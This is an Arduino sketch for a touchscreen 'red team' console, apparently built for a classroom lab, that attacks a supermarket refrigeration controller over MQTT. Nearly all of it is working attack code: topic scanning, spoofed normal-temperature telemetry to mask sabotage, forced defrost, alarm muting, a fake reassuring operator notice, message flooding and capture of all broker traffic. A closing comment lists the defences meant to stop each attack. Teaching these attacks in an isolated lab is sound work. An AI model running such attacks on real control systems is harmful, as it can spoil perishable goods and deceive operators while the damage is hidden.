/* =============================================================================
 *  PROJET RED/BLUE - "TempRegulator Supermarket Attack"
 *  Fichier  : tab5_attacker.ino
 *  Rôle     : CONSOLE D'ATTAQUE (M5Stack Tab5) pour l'ÉQUIPE ROUGE.
 *             Menu tactile déclenchant des attaques MQTT contre le rayon frais.
 *
 *  ⚠️  USAGE STRICTEMENT PÉDAGOGIQUE — laboratoire isolé GI-CNAM uniquement.
 *      Toute utilisation hors de ce réseau de classe est interdite et illégale.
 *
 *  Chaque bouton illustre UNE technique de pentest (voir rapport). Les attaques
 *  "lourdes" (bruteforce, MITM, DDoS massif) se font côté Kali via mqtt_pentest.py ;
 *  cette console sert aux injections rapides et aux démonstrations en direct.
 *
 *  Librairies : M5Unified, PubSubClient, ArduinoJson.
 * ============================================================================= */

#include <M5Unified.h>
#include <WiFi.h>
#include <PubSubClient.h>
#include <ArduinoJson.h>

/* --- Cible : le MÊME WiFi et le MÊME broker que la victime (c'est la faille) --- */
const char* WIFI_SSID = "RAYON_FRAIS";
const char* WIFI_PASS = "supermarket2026";
const char* MQTT_HOST = "192.168.10.10";
uint16_t    MQTT_PORT = 1883;
const char* MQTT_USER = "";                 // anonyme possible en Phase 1
const char* MQTT_PASS = "";

#define GROUP "g1"   // cible du groupe : g1..g4 (doit viser la victime de CE groupe)
#define T_TELEMETRY ("market/" GROUP "/fridge/telemetry")
#define T_CMD       ("market/" GROUP "/fridge/cmd")
#define T_NOTIFY    ("market/" GROUP "/tab5/notify")
#define T_WILD      ("market/" GROUP "/#")   // scope groupe (un vrai "#" verrait TOUS les groupes)

WiFiClient   net;
PubSubClient mqtt(net);

/* -------------------------------- MENU ----------------------------------- */
struct Btn { const char* label; uint16_t color; };
Btn buttons[] = {
  {"1. SCAN topics (#)",       TFT_BLUE},     // ATT-01 reconnaissance
  {"2. FAUX capteur 4.0C",     TFT_PURPLE},   // ATT-05 spoofing (masque le dégivrage)
  {"3. DEGIVRAGE ON (sabotage)",TFT_RED},     // ATT-05 injection commande
  {"4. MUTE alarme",           TFT_MAROON},   // ATT-05 désactiver la sécurité
  {"5. Notif rassurante",      TFT_OLIVE},    // ATT-08/leurre social
  {"6. FLOOD telemetry x200",  TFT_ORANGE},   // ATT-07 DoS applicatif
  {"7. EXFIL (dump #)",        TFT_DARKGREEN},// ATT-09 exfiltration
  {"8. STOP / reset cible",    TFT_DARKGREY}, // remet defrost=off, setpoint=4
};
const int NB = sizeof(buttons) / sizeof(buttons[0]);
String logLine = "Pret.";
volatile long exfilCount = 0;
bool exfilOn = false;

/* ------------------------------- OUTILS ---------------------------------- */
void publishJson(const char* topic, const JsonDocument& doc) {
  char buf[256]; size_t n = serializeJson(doc, buf);
  mqtt.publish(topic, buf, n);
}

void onMessage(char* topic, byte* payload, unsigned int len) {
  // Mode exfiltration : on affiche/compte tout ce qui transite (abonnement '#').
  if (!exfilOn) return;
  exfilCount++;
  String p; for (unsigned i = 0; i < len && i < 60; i++) p += (char)payload[i];
  logLine = String("EXFIL ") + topic + " = " + p;
  Serial.printf("[EXFIL] %s | %s\n", topic, p.c_str());
}

/* ------------------------------ ATTAQUES --------------------------------- */
void attScanTopics() {
  exfilOn = false;
  mqtt.subscribe(T_WILD);
  logLine = "Abonne a '#' : topics decouverts dans la console serie.";
  exfilOn = true;                      // réutilise le callback pour lister
}

void attFakeSensor() {                 // ATT-05 : fausse température "tout va bien"
  StaticJsonDocument<128> d;
  d["temp"] = 4.0; d["hum"] = 55.0; d["setpoint"] = 4.0;
  d["defrost"] = false; d["alarm"] = false; d["ts"] = millis();
  publishJson(T_TELEMETRY, d);
  logLine = "Injecte fausse telemetry 4.0C (masque le sabotage).";
}

void attDefrostOn() {                  // ATT-05 : commande malveillante de dégivrage
  StaticJsonDocument<64> d; d["defrost"] = true;
  publishJson(T_CMD, d);
  logLine = "DEGIVRAGE force ON -> la cible va chauffer !";
}

void attMuteAlarm() {                  // ATT-05 : couper la sécurité métier
  StaticJsonDocument<64> d; d["mute"] = true;
  publishJson(T_CMD, d);
  logLine = "Alarme coupee (mute=true).";
}

void attFakeNotify() {                 // leurre : rassurer l'opérateur
  StaticJsonDocument<96> d;
  d["level"] = "info"; d["msg"] = "Systeme nominal - maintenance en cours";
  publishJson(T_NOTIFY, d);
  logLine = "Fausse notification rassurante envoyee au pupitre.";
}

void attFlood() {                      // ATT-07 : DoS applicatif (storm)
  StaticJsonDocument<96> d;
  for (int i = 0; i < 200; i++) {
    d["temp"] = random(-200, 200) / 10.0; d["ts"] = i;
    publishJson(T_TELEMETRY, d);
  }
  logLine = "FLOOD : 200 messages envoyes sur telemetry.";
}

void attExfil() {                      // ATT-09 : capture globale
  exfilCount = 0; exfilOn = true;
  mqtt.subscribe(T_WILD);
  logLine = "EXFILTRATION active : capture de tous les topics...";
}

void attReset() {                      // remet la cible propre entre 2 démos
  exfilOn = false;
  StaticJsonDocument<96> d; d["defrost"] = false; d["setpoint"] = 4.0; d["mute"] = false;
  publishJson(T_CMD, d);
  logLine = "Cible reinitialisee (defrost off, setpoint 4).";
}

void runAttack(int i) {
  switch (i) {
    case 0: attScanTopics(); break;  case 1: attFakeSensor(); break;
    case 2: attDefrostOn();  break;  case 3: attMuteAlarm();  break;
    case 4: attFakeNotify(); break;  case 5: attFlood();      break;
    case 6: attExfil();      break;  case 7: attReset();      break;
  }
}

/* ------------------------------- UI -------------------------------------- */
int btnH, cols = 2, rows;
void drawMenu() {
  auto& d = M5.Display;
  d.fillScreen(TFT_BLACK);
  d.fillRect(0, 0, d.width(), 46, TFT_RED);
  d.setTextColor(TFT_WHITE); d.setTextSize(3);
  d.setCursor(12, 10); d.print("RED TEAM - Console d'attaque");

  rows = (NB + cols - 1) / cols;
  btnH = (d.height() - 46 - 70) / rows;
  int w = d.width() / cols;
  for (int i = 0; i < NB; i++) {
    int cx = (i % cols) * w, cy = 46 + (i / cols) * btnH;
    d.fillRoundRect(cx + 6, cy + 6, w - 12, btnH - 12, 8, buttons[i].color);
    d.setTextColor(TFT_WHITE); d.setTextSize(2);
    d.setCursor(cx + 16, cy + btnH / 2 - 6); d.print(buttons[i].label);
  }
  d.fillRect(0, d.height() - 64, d.width(), 64, TFT_DARKGREY);
  d.setTextSize(2); d.setTextColor(TFT_GREENYELLOW);
  d.setCursor(10, d.height() - 46); d.print(logLine.substring(0, 54));
  if (exfilOn) { d.setCursor(10, d.height() - 24);
                 d.printf("messages captures : %ld", exfilCount); }
}

int hitTest(int x, int y) {
  if (y < 46 || y > M5.Display.height() - 64) return -1;
  int w = M5.Display.width() / cols;
  int col = x / w, row = (y - 46) / btnH, i = row * cols + col;
  return (i >= 0 && i < NB) ? i : -1;
}

/* ------------------------------ WIFI/MQTT -------------------------------- */
void wifiConnect() {
  WiFi.mode(WIFI_STA); WiFi.begin(WIFI_SSID, WIFI_PASS);
  uint32_t t0 = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - t0 < 15000) delay(300);
}
void mqttConnect() {
  mqtt.setServer(MQTT_HOST, MQTT_PORT); mqtt.setCallback(onMessage);
  while (!mqtt.connected()) {
    bool ok = (strlen(MQTT_USER) > 0)
                ? mqtt.connect("atk-" GROUP, MQTT_USER, MQTT_PASS)
                : mqtt.connect("atk-" GROUP);
    if (!ok) delay(1500);
  }
}

void setup() {
  auto cfg = M5.config(); M5.begin(cfg);
  M5.Display.setRotation(1);
  Serial.begin(115200);
  wifiConnect(); mqttConnect();
  drawMenu();
}

void loop() {
  M5.update();
  if (!mqtt.connected()) mqttConnect();
  mqtt.loop();

  if (M5.Touch.getCount()) {
    auto t = M5.Touch.getDetail();
    if (t.wasPressed()) {
      int i = hitTest(t.x, t.y);
      if (i >= 0) { runAttack(i); drawMenu(); }
    }
  }
  static unsigned long last = 0;
  if (exfilOn && millis() - last > 600) { last = millis(); drawMenu(); }
}

/* =============================================================================
 *  Quand l'ÉQUIPE BLEUE a durci la cible, CES BOUTONS DOIVENT ÉCHOUER :
 *   - SCAN/EXFIL (#)  -> refusés par l'ACL du broker (pas de wildcard pour ce client)
 *   - FAUX capteur    -> refusé : seul le compte "sensor" peut publier telemetry (D1)
 *   - DEGIVRAGE/MUTE  -> refusé : commandes réservées à l'identité "regulator" (D1)
 *   - connexion même  -> refusée : plus d'anonyme + MAC non autorisée au WiFi (D8/D9)
 *  C'est la PREUVE de remédiation à consigner dans le rapport (re-test Phase 3).
 * ============================================================================= */
